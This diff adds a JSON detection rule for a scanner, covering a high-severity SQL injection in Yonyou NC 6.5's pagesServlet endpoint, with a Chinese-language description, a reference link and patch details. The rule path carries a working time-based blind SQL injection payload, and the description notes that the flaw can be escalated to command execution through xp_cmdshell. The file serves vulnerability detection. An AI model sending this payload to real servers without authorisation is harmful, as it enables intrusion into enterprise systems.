@@ -1,0 +1,24 @@
+{
+    "vul_name": "用友NC pagesServlet SQL注入漏洞",
+    "level": "高危",
+    "description": "用友NC /portal/pt/servlet/pagesServlet/doPost接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。",
+    "product": "用友网络科技股份有限公司-NC6.5",
+    "version": "用友NC6.5",
+    "cve": "",
+    "reference": "https://mp.weixin.qq.com/s/r-4VVO8CugmtCFC0J2D0hA",
+    "fixing": "打对应补丁，重启服务，\n补丁名称：\npatch_portal65_pagesServlet安全漏洞\n补丁编码：\nNCM_NC6.5_000_109902_20240531_GP_122891925",
+    "rule": {
+        "path": "/portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1%27%20AND%206371%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28107%29%7C%7CCHR%2866%29%7C%7CCHR%28105%29%7C%7CCHR%2889%29%2C5%29--",
+        "method": "GET",
+        "headers": "",
+        "body": "",
+        "status_code": "200",
+        "keywords": "xml",
+        "res_time": "5"
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
